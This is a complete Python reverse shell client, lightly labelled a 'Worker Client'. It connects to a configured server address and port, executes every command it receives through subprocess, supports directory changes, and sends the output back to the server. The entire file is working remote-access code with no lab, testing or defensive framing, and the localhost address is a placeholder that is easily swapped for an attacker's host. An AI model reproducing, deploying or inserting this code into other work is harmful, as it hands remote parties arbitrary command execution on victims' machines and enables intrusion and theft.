import socket
import os
import subprocess

# Worker Client configuration
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

# Create a socket object
s = socket.socket()
# Connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    # Receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    
    if command.strip().lower() == "exit":
        # If the command is exit, break the loop and stop
        break
    
    # Check if it's a cd command, if so, change directory
    if command.startswith("cd "):
        try:
            os.chdir(command.split(" ", 1)[1])
            output = ""
        except FileNotFoundError as e:
            output = str(e)
    else:
        # Otherwise, execute the command and get the output
        output = subprocess.getoutput(command)
    
    # Get current directory
    cwd = os.getcwd()
    
    # Send the output back to the server
    message = f"{output}\n{cwd}"
    s.send(message.encode())

# Close the connection
s.close()
